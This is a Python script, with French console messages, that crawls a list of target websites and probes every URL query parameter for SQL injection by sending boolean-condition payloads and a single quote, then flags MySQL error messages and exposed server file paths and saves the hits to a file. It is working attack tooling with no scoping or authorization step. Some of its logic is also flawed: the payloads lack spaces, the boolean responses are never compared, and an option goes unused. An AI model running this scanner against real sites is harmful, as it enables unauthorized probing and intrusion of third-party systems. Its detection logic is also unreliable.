#!/usr/bin/env python3
"""
Katana-style Crawler + SQLi Scanner
"""
import requests
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, quote
from bs4 import BeautifulSoup
import re
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore
import argparse
import sys
import hashlib

init(autoreset=True)

class SQLiScanner:
    def __init__(self, timeout=10, delay=0.5):
        self.timeout = timeout
        self.delay = delay
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})
        
        self.true_payload = "AND5028=5028"
        self.false_payload = "AND5028=5029"
        
        self.sql_keywords = [
            "mysql_fetch", "mysql_num_rows", "mysql_result",
            "MySQLSyntaxErrorException", "mysqli_sql_exception",
            "You have an error in your SQL syntax",
            "Unknown column", "MySQL_Error", "supplied argument is not",
            "expects parameter", "boolean given", "resource, boolean",
            "headers already sent", "Fatal error", "Stack trace",
            "Warning:", "Parse error:", "Uncaught",
        ]
        
        self.sql_patterns = [
            (re.compile(r"mysql_num_rows\(\) expects parameter 1 to be resource, boolean given in .*? on line \d+", re.IGNORECASE), "mysql_num_rows boolean"),
            (re.compile(r"mysql_fetch_array\(\) expects parameter 1 to be resource, boolean given in .*? on line \d+", re.IGNORECASE), "mysql_fetch_array boolean"),
            (re.compile(r"Cannot modify header information - headers already sent by \(output started at .*?:\d+\)", re.IGNORECASE), "headers already sent"),
            (re.compile(r"Fatal error: Uncaught mysqli_sql_exception:.*?near '(.*?)'.*?in (.*?):\d+\s+Stack trace:.*?#.*?{main}", re.IGNORECASE | re.DOTALL), "fatal mysqli with stack"),
            (re.compile(r"in (/home[^:]+\.php) on line \d+", re.IGNORECASE), "home path exposed"),
            (re.compile(r"in (/var/www[^:]+\.php) on line \d+", re.IGNORECASE), "var path exposed"),
            (re.compile(r"in (/www[^:]+\.php) on line \d+", re.IGNORECASE), "www path exposed"),
        ]
        
        self.vulnerable_urls = set()
        self.results_cache = {}
        self.found_errors = {}

    def url_has_parameters(self, url: str) -> bool:
        parsed = urlparse(url)
        return bool(parsed.query)

    def check_mysql_error(self, url: str) -> bool:
        try:
            response = self.session.get(url, timeout=self.timeout)
            content = response.text
            found = False
            
            for keyword in self.sql_keywords:
                if keyword.lower() in content.lower():
                    print(f"{Fore.RED}[!] Mot-clé SQL trouvé: {keyword}")
                    found = True
            
            for pattern, pattern_name in self.sql_patterns:
                if pattern.search(content):
                    print(f"{Fore.RED}[!] Pattern précis trouvé: {pattern_name}")
                    found = True
            
            return found
        except:
            return False

    def test_single_url(self, url: str):
        if not self.url_has_parameters(url):
            return
        
        print(f"{Fore.YELLOW}[→] Test: {url}")
        
        if self.check_mysql_error(url):
            print(f"{Fore.RED}[!] ⚠️  Erreur MySQL trouvée: {url}")
            self.vulnerable_urls.add(url)
            return
        
        parsed = urlparse(url)
        original_params = parse_qs(parsed.query)
        
        try:
            normal_response = self.session.get(url, timeout=self.timeout)
            normal_content = normal_response.text
        except:
            return
        
        for param_name in original_params.keys():
            try:
                true_params = original_params.copy()
                true_params[param_name] = [f"1{self.true_payload}"]
                true_url = parsed._replace(query=urlencode(true_params, doseq=True)).geturl()
                
                false_params = original_params.copy()
                false_params[param_name] = [f"1{self.false_payload}"]
                false_url = parsed._replace(query=urlencode(false_params, doseq=True)).geturl()
                
                quote_params = original_params.copy()
                quote_params[param_name] = ["'"]
                quote_url = parsed._replace(query=urlencode(quote_params, doseq=True)).geturl()
                
                if self.check_mysql_error(true_url) or self.check_mysql_error(false_url) or self.check_mysql_error(quote_url):
                    self.vulnerable_urls.add(url)
                    print(f"{Fore.RED}[!] SQLi CONFIRMÉE: {url} [{param_name}]")
                    return
                
                time.sleep(self.delay)
            except:
                continue


class KatanaCrawler:
    def __init__(self, urls_file: str, max_depth: int = 2, concurrency: int = 5,
                 crawl_scope: str = None, js_crawl: bool = False):
        self.urls_file = urls_file
        self.max_depth = max_depth
        self.concurrency = concurrency
        self.crawl_scope = crawl_scope
        self.js_crawl = js_crawl
        
        self.visited = set()
        self.urls_to_scan = []
        
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})
        
        self.scanner = SQLiScanner()
        
        if self.crawl_scope:
            try:
                self.scope_pattern = re.compile(self.crawl_scope)
                print(f"{Fore.GREEN}[✓] Filtre de crawl: {self.crawl_scope}")
            except re.error:
                print(f"{Fore.RED}[✗] Regex invalide: {self.crawl_scope}")
                sys.exit(1)
        else:
            self.scope_pattern = None

    def load_target_urls(self) -> list:
        try:
            with open(self.urls_file, 'r', encoding='utf-8') as f:
                urls = [line.strip() for line in f if line.strip()]
            print(f"{Fore.GREEN}[✓] {len(urls)} URLs chargées")
            return urls
        except Exception as e:
            print(f"{Fore.RED}[✗] Erreur chargement: {e}")
            return []

    def crawl_site(self, url: str, current_depth: int = 0):
        if url in self.visited or current_depth > self.max_depth:
            return
        
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
            
        print(f"{Fore.CYAN}[*] Crawl [{current_depth}/{self.max_depth}]: {url}")
        
        try:
            response = self.session.get(url, timeout=10)
            self.visited.add(url)
            
            if self.scanner.url_has_parameters(url):
                self.urls_to_scan.append(url)
                print(f"{Fore.GREEN}[+] À scanner: {url}")
            
            if current_depth < self.max_depth:
                soup = BeautifulSoup(response.text, 'html.parser')
                base_domain = urlparse(url).netloc
                
                for link in soup.find_all('a', href=True):
                    full_url = urljoin(url, link['href'])
                    if urlparse(full_url).netloc == base_domain and full_url not in self.visited:
                        self.crawl_site(full_url, current_depth + 1)
        except Exception as e:
            print(f"{Fore.YELLOW}[-] Erreur: {str(e)[:50]}")

    def scan_urls_for_sqli(self):
        if not self.urls_to_scan:
            print(f"{Fore.YELLOW}[!] Aucune URL à scanner")
            return
        
        print(f"\n{Fore.MAGENTA}{'='*60}")
        print(f" Scan SQLi sur {len(self.urls_to_scan)} URLs")
        print(f"{'='*60}")
        
        with ThreadPoolExecutor(max_workers=self.concurrency) as executor:
            futures = [executor.submit(self.scanner.test_single_url, url) for url in self.urls_to_scan]
            for future in as_completed(futures):
                try:
                    future.result()
                except:
                    pass

    def save_results(self, output_file: str = "vulnerable.txt"):
        vulns = sorted(list(self.scanner.vulnerable_urls))
        
        if vulns:
            with open(output_file, 'w', encoding='utf-8') as f:
                for url in vulns:
                    f.write(f"{url}\n")
            print(f"\n{Fore.GREEN}[✓] {len(vulns)} URLs vulnérables sauvegardées dans {output_file}")
        else:
            print(f"\n{Fore.YELLOW}[!] Aucune vulnérabilité trouvée")

    def run(self):
        start_urls = self.load_target_urls()
        if not start_urls:
            return
        
        print(f"\n{Fore.MAGENTA}{'='*60}")
        print(" Phase 1: Crawling")
        print(f"{'='*60}")
        
        for url in start_urls:
            self.crawl_site(url)
        
        if self.urls_to_scan:
            self.scan_urls_for_sqli()
        
        self.save_results()


def main():
    parser = argparse.ArgumentParser(description='Katana crawler + SQLi scanner')
    parser.add_argument('-l', '--list', required=True, help='Fichier URLs')
    parser.add_argument('-d', '--depth', type=int, default=2, help='Profondeur')
    parser.add_argument('-c', '--concurrency', type=int, default=5, help='Threads')
    parser.add_argument('-o', '--output', default='vulnerable.txt', help='Sortie')
    parser.add_argument('-cs', '--crawl-scope', help='Regex scope')
    parser.add_argument('-jc', '--js-crawl', action='store_true', help='Crawl JS')
    
    args = parser.parse_args()
    
    print(f"{Fore.MAGENTA}{'='*60}")
    print(" Katana Crawler + SQLi Scanner")
    print(f"{'='*60}")
    
    crawler = KatanaCrawler(
        urls_file=args.list,
        max_depth=args.depth,
        concurrency=args.concurrency,
        crawl_scope=args.crawl_scope,
        js_crawl=args.js_crawl
    )
    
    try:
        crawler.run()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrompu")

if __name__ == "__main__":
    main()
